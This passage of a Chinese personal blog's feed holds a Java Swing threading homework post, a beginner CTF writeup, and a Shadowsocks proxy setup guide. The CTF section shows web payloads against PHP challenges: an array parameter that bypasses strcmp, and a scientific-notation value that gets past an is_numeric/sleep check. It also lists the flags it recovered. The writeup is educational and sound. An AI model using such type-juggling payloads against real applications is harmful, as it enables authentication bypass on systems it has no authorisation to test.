title="标签移动"></a>标签移动</h2><p><strong>要求：</strong>编写一个图形用户界面程序，窗体的宽度300，高度150，布局管理器为null，窗体上有二个标签和二个按钮，标签的位置为（10,30）和（200,60），按钮的位置为（50,100）和（150,100），它们的宽度和高度都是80和20。编写一个线程，该线程可以让标签向右或向左移动10次，每次移动10个单位，间隔1秒，通过按钮的动作事件启动上述线程，“向右走”按钮启动“向右移标签”，“向左走”按钮启动“向左移标签”；</p><p><strong>分析：</strong></p><p>1.这个程序需要用到关于线程的知识，先根据题目所给出的数据添加需要用到的组件，需要用到两个标签JLabel，两个按钮JButton；</p><p>2.需要创建一个movethread类继承Thread类，里面需要判断到底是向右移动还是向左移动，这里在movethread类中设置了一个bolean类型的变量a，在构造方法中将其进行初始化，如果a==true，就右移，否则左移即可；</p><p>3.在movethread类中生成run()方法覆盖原来的run(),在此方法中对a的值进行判断，如果a为true则调用setlocation()方法，改变label的位置，调用sleep(1000)进行暂停，每一秒移动10个单位；</p><p>4.添加事件监听器；</p><p><strong>源码如下：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> homework3;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">move</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JLabel lab1;</span><br><span class="line">JLabel lab2;</span><br><span class="line">JButton b1;</span><br><span class="line">JButton b2;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startframe</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.setSize(<span class="number">300</span>, <span class="number">200</span>);</span><br><span class="line"><span class="keyword">this</span>.setTitle(<span class="string">"move"</span>);</span><br><span class="line"><span class="keyword">this</span>.setLocationRelativeTo(<span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">this</span>.setLayout(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.lab1 =<span class="keyword">new</span> JLabel(<span class="string">"右移标签"</span>);</span><br><span class="line"><span class="keyword">this</span>.lab2=<span class="keyword">new</span> JLabel(<span class="string">"左移标签"</span>);</span><br><span class="line">lab1.setBounds(<span class="number">10</span>, <span class="number">30</span>, <span class="number">80</span>, <span class="number">20</span>);</span><br><span class="line">lab2.setBounds(<span class="number">200</span>, <span class="number">60</span>, <span class="number">80</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">this</span>.add(lab1);</span><br><span class="line"><span class="keyword">this</span>.add(lab2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.b1=<span class="keyword">new</span> JButton(<span class="string">"向右"</span>);</span><br><span class="line"><span class="keyword">this</span>.b2=<span class="keyword">new</span> JButton(<span class="string">"向左"</span>);</span><br><span class="line">b1.setBounds(<span class="number">50</span>, <span class="number">100</span>, <span class="number">80</span>, <span class="number">20</span>);</span><br><span class="line">b2.setBounds(<span class="number">150</span>, <span class="number">100</span>, <span class="number">80</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">this</span>.add(b1);</span><br><span class="line"><span class="keyword">this</span>.add(b2);</span><br><span class="line"></span><br><span class="line">b1.addActionListener(<span class="keyword">new</span> myactionlistener1());</span><br><span class="line">b2.addActionListener(<span class="keyword">new</span> myactionlistener2());</span><br><span class="line"><span class="keyword">this</span>.setVisible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">movethread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">boolean</span> a;</span><br><span class="line"><span class="keyword">int</span> size;</span><br><span class="line">JLabel lab;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">movethread</span><span class="params">(<span class="keyword">boolean</span> A)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.a=A;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span> </span><br><span class="line">&#123;</span><br><span class="line">sleep(<span class="number">1000</span>);</span><br><span class="line">lab1.setLocation(lab1.getX()+<span class="number">10</span>, lab1.getY());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(InterruptedException ie)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span> </span><br><span class="line">&#123;</span><br><span class="line">sleep(<span class="number">1000</span>);</span><br><span class="line">lab2.setLocation(lab2.getX()-<span class="number">10</span>, lab2.getY());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(InterruptedException ie)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myactionlistener1</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">movethread m1=<span class="keyword">new</span> movethread(<span class="keyword">true</span>);</span><br><span class="line">m1.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myactionlistener2</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">movethread m2=<span class="keyword">new</span> movethread(<span class="keyword">false</span>);</span><br><span class="line">m2.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String Args[])</span> </span>&#123;</span><br><span class="line">move M=<span class="keyword">new</span> move();</span><br><span class="line">M.startframe();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>结果：</strong>分别是初始界面和向右向左移动后的界面，移动中两者互不影响</p><p><img src="https://s1.ax1x.com/2018/12/31/F4DvYq.png" alt="F4DvYq.png"><img src="https://s1.ax1x.com/2018/12/31/F4Dxf0.png" alt="F4Dxf0.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Java上课都没认真听过，菜的一批……
    
    </summary>
    
      <category term="Study" scheme="https://gardenia30.top/categories/Study/"/>
    
    
      <category term="Java" scheme="https://gardenia30.top/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Drops CTF Writeup</title>
    <link href="https://gardenia30.top/2018/12/25/Drops-CTF-Writeup/"/>
    <id>https://gardenia30.top/2018/12/25/Drops-CTF-Writeup/</id>
    <published>2018-12-25T15:36:41.000Z</published>
    <updated>2019-01-13T11:06:09.760Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmmm……学长说挺适合新手的，就拿来做了做，发现还是可以学习一波的。<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>这题看到页面也没什么思路，非常炫酷的一个界面，老套路，拿御剑扫了一波目录，没发现什么奇怪的地方，于是查看了一波消息头，发现tips</p><p><img src="https://s1.ax1x.com/2018/12/25/FgAfzt.png" alt="img"></p><p>打开文件发现源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"***"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'repo'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'repo'</span>], $flag) == <span class="number">0</span>) </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'No'</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个简单的strcmp函数的绕过，只需要构造一个数组即可返回0</p><p>payload:<code>http://39.108.109.85:9000/?repo[]=0</code></p><h3 id="快一点"><a href="#快一点" class="headerlink" title="快一点"></a>快一点</h3><p>这题一开始就让<code>You need get a &#39;t&#39;</code>直接GET传一个t上去就可以看见源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'t'</span>]))&#123;</span><br><span class="line">    $_COOKIE[<span class="string">'bash_token'</span>] = $_GET[<span class="string">'t'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"You need get a 't'"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'sleep'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($_POST[<span class="string">'sleep'</span>]))&#123;              </span><br><span class="line">                                      </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Gime me a number plz.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too short.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_POST[<span class="string">'sleep'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'NoNoNo sleep too long.'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        sleep((int)$_POST[<span class="string">'sleep'</span>]);  </span><br><span class="line">        getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大概意思就是先传一个t，然后POST一个sleep上去，要求sleep必须要通过<strong>is_numeric()</strong>函数的验证，这个函数可以判断是否为数字和数字字符串，意思就是传一个数字字符或者数字，满足以下条件：</p><p>1.sleep&gt;=60*60*24*30*2</p><p>2.sleep&lt;=60*60*24*30*3</p><p>传了一个两个值中间的值过去，始终得不到回显，果然没有那么简单，<code>sleep()</code>是php的一个暂停函数，意思是停下sleep秒，暂停了<code>getflag()</code>的执行，采用构造一个科学计数法的方法POST了一个<code>6e6</code>回显flag</p><p><img src="https://s1.ax1x.com/2018/12/25/FgVlHU.png" alt="img"></p><p>为什么要构造科学计数法呢，这边进行了一下本地测试，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump($_GET[<span class="string">'a'</span>]);</span><br><span class="line">var_dump((int)$_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其实这就是用来测试平时GET进来的变量到底是什么类型的，测试了一下，发现所有GET进来的变量都是<strong>string</strong>类型，即使是数字也是string类型(惊呆……)学习到了……</p><p><a href="https://imgchr.com/i/Fga60S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/25/Fga60S.png" alt="Fga60S.png"></a></p><p>然后发现执行强制类型转换的时候，<code>先识别前面的数字，到不是数字的字符为止，如果第一个值就不是数字，那强制转换的结果就为0</code></p><p>所以这题先识别到GET到的参数<code>6e6</code>是一个数字字符，通过is_numberic函数的验证，然后强制类型转化的时候，转化为了<code>int(6)</code>,所以只需要等待6秒即可得到flag</p><p><code>drops{2018_ctf_zhongyuangong_xiaosai}</code></p><p><strong>attention</strong>这题还可以通过构造16进制数的方法来绕过sleep()函数,原理一致。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="你了解我么"><a href="#你了解我么" class="headerlink" title="你了解我么"></a>你了解我么</h3><p>点进去一看是一张海伦凯勒的图片，应该就是盲文没错了……</p><p>百度一波解出盲文为<code>kmdonowg</code>，使用py的MD5加密得到flag<code>drops{8aa5b596bf284a6dd446f9e141b47861}</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="图书馆"><a href="#图书馆" class="headerlink" title="图书馆"></a>图书馆</h3><p>这题拿到直接放进hex编辑器看了一下文件尾部有pk，证明里面有压缩包</p><p><a href="https://imgchr.com/i/Fg15y4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/25/Fg15y4.png" alt="Fg15y4.png"></a></p><p>直接将后缀改为zip解压，得到一个2.txt文件，打开发现一堆乱码，但看到<strong>IDHR</strong>想到是png文件的文件头，就直接将后缀改为png，果然得到一张图片；</p><p><a href="https://imgchr.com/i/Fg1OfK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/25/Fg1OfK.png" alt="Fg1OfK.png"></a></p><p><code>qebcf{nfqs25kjps8rjsi8kfqnfp42kizaoip}</code>有点奇怪……</p><p>但是根据上面的经验所有的flag都是以<strong>drops</strong>开头的，所以想到是凯撒移位加密，用工具解密得到flag</p><p><a href="https://imgchr.com/i/Fg8S3T" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/25/Fg8S3T.png" alt="Fg8S3T.png"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;emmmm……学长说挺适合新手的，就拿来做了做，发现还是可以学习一波的。
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://gardenia30.top/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>DigitalOcean+PuTTY+SS如何撸梯子</title>
    <link href="https://gardenia30.top/2018/12/22/DigitalOcean+PuTTY+SS%E5%A6%82%E4%BD%95%E6%92%B8%E6%A2%AF%E5%AD%90/"/>
    <id>https://gardenia30.top/2018/12/22/DigitalOcean+PuTTY+SS如何撸梯子/</id>
    <published>2018-12-22T13:34:39.000Z</published>
    <updated>2018-12-23T03:46:54.703Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直拿VPN翻墙超级卡，于是下定决心用了大半天时间撸了个梯子，感谢隔壁磊哥（巨佬）的热心帮助！<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="购买VPS"><a href="#购买VPS" class="headerlink" title="购买VPS"></a>购买VPS</h2><p>早就听说有github学生包这个优惠活动，就提前申请了一波，一个edu邮箱就可以了，免费拿到digital ocean的50美元优惠兑换码，接着直接就可以创建DO的账户，从我的链接进去直接注册就可以免费赠送10刀<a href="https://m.do.co/c/091768c54a8a" target="_blank" rel="noopener">click here</a>，创建账户的前提就是充值5刀，折合35块吧，够我用一年了,非常划算。</p><p>总共拿到55美刀，买了个美国旧金山的服务器，5刀一个月，1TB流量，unbuntu系统，感觉还行，感觉后来速度也不错，推荐购买。</p><p>买了以后会发给你账户原始密码，直接进入Droplets页面进行设置，Launch Console进入命令行，输入原始密码进行登录，修改密码即可</p><p><img src="https://s1.ax1x.com/2018/12/22/FydSxK.png" alt="img"></p><h2 id="下载PuTTY"><a href="#下载PuTTY" class="headerlink" title="下载PuTTY"></a>下载PuTTY</h2><p>和隔壁小敏子（另一个巨佬）要了个PuTTY的包直接就安装好了，打开以后直接输入IP等一系列信息就可以直接登上去</p><p><img src="https://s1.ax1x.com/2018/12/22/FydBdJ.png" alt="img"></p><p>PuTTY是一个Telnet、SSH、rlogin、纯TCP以及串行接口连接软件，可以直接连接上我的VPS，当然Xshell也是一个不错的选择。</p><h2 id="配置VPS"><a href="#配置VPS" class="headerlink" title="配置VPS"></a>配置VPS</h2><p>1.build-essential安装</p><p>linux操作系统上面开发程序，光有了gcc 是不行的它还需要一个build-essential软件包作用是提供编译程序必须软件包的列表信息，也就是说 编译程序有了这个软件包，它才知道 头文件在哪 才知道库函数在哪，还会下载依赖的软件包   最后才组成一个开发环境，当然 build-essential包 安装时 需要的依赖包 有些你用不上  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install build-essential</span><br></pre></td></tr></table></figure><p>2.安装pip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-pip</span><br></pre></td></tr></table></figure><p>3.安装shadowsocks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure><p>4.更新软件列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><p>5.配置shadowsocks</p><p>linux自带了神器vim编辑器，学习一波用法<a href="http://www.runoob.com/linux/linux-vim.html" target="_blank" rel="noopener">我是链接啊啊啊！</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/shadowsocks.json</span><br></pre></td></tr></table></figure><p>新建ss配置文件，输入以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;server&quot;:&quot;::&quot;,</span><br><span class="line">&quot;server_port&quot;: 选一个端口就好,</span><br><span class="line">&quot;local_port&quot;: 1080,</span><br><span class="line">&quot;timeout&quot;:300,</span><br><span class="line">&quot;password&quot;: &quot;yourpassword&quot;,</span><br><span class="line">&quot;method&quot;:&quot;aes-256-cfb&quot;,</span><br><span class="line">&quot;fast_open&quot;:true,</span><br><span class="line">&quot;workers&quot;:1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>:wq保存退出就好，此时已经完成了对ss的配置。</p><p>6.在VPS上运行shadowsocks</p><p>输入以下命令，看见started就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br></pre></td></tr></table></figure><p>7.本地接入ss</p><p>唉~移动网络真的是垃圾的一批，进github都要那么久，在github上down了一个shadowsocks.exe下来，输入刚刚配置的信息点击确定，打开启用系统代理即可</p><p>8.第八条专门用来吐槽我的今天的经历，真的是无f**k可说，经过千辛万苦连接上了ss但没想到访问不了Google，但是连我的手机热点和舍友的无线就可以，真的是……唉~算了，自己慢慢解决吧，终于查到了问题所在，我是直接插光纤上网的，而ss的启动系统代理默认的是给你打开局域网设置的代理，所以我**的忙活了那么久竟然是一个如此低端的问题，我还以为是我的ss配置错了……下面是解决办法。</p><h2 id="安装配置SwitchyOmega"><a href="#安装配置SwitchyOmega" class="headerlink" title="安装配置SwitchyOmega"></a>安装配置SwitchyOmega</h2><p>这是一个Google的插件，专门用来设置代理</p><p>不多说，扔两张图：</p><p><strong>全局代理设置：</strong></p><p><img src="https://s1.ax1x.com/2018/12/22/FywqhR.png" alt="img"></p><p><strong>PAC模式设置：</strong></p><p><img src="https://s1.ax1x.com/2018/12/22/Fywjc6.png" alt="img"></p><p>PAC设置的PAC网址就是打开局域网设置里面的脚本地址，填入以后应用，更新即可，PAC唯一的好处就是走国内的可以快一点，节省一点流量。</p><h2 id="BBR算法提速"><a href="#BBR算法提速" class="headerlink" title="BBR算法提速"></a>BBR算法提速</h2><p>不多说，速度还是挺慢的，需要Google发布的TCP BBR算法，给我的vps提一波速，Linux4.9的内核已经支持TCP BBR了。</p><p>1.先查看内核版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure><p>2.如果不够，将内核升级到4.9.10,先下载安装包；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.9.10/linux-image-4.9.10-040910-generic_4.9.10-040910.201702141931_amd64.deb</span><br></pre></td></tr></table></figure><p>3.安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i linux-image-4.9.10-040910-generic_4.9.10-040910.201702141931_amd64.deb</span><br></pre></td></tr></table></figure><p>4.查看当前有哪些内核</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep linux-image</span><br></pre></td></tr></table></figure><p>5.删除旧的内核(我的是4.4)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get purge *4.4*</span><br></pre></td></tr></table></figure><p>6.更新引导</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-grub</span><br></pre></td></tr></table></figure><p>7.重启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><p>8.编辑sysctl.conf文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>在末尾添加如下两行后保存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net.core.default_qdisc=fq</span><br><span class="line">net.ipv4.tcp_congestion_control=bbr</span><br></pre></td></tr></table></figure><p>9.执行如下操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sysctl -p           #使配置生效</span><br><span class="line"></span><br><span class="line">lsmod | grep bbr</span><br></pre></td></tr></table></figure><p>出现tcp_bbr即可，证明提速已经生效</p><p>10.刚刚已经重启了一次，所以要再次将shadowsocks在vps上跑起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>现在我终于花了一天时间撸好了我的梯子……以后终于可以不受我大天朝网络封锁带来的影响，尽情遨游网络世界了，也希望这对以后的学习可以有所帮助。不说了，继续撸密码学了……</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一直拿VPN翻墙超级卡，于是下定决心用了大半天时间撸了个梯子，感谢隔壁磊哥（巨佬）的热心帮助！
    
    </summary>
    
      <category term="VPS" scheme="https://gardenia30.top/categories/VPS/"/>
    
    
      <category term="my vps" scheme="https://gardenia30.top/tags/my-vps/"/>
    
  </entry>
  
</feed>
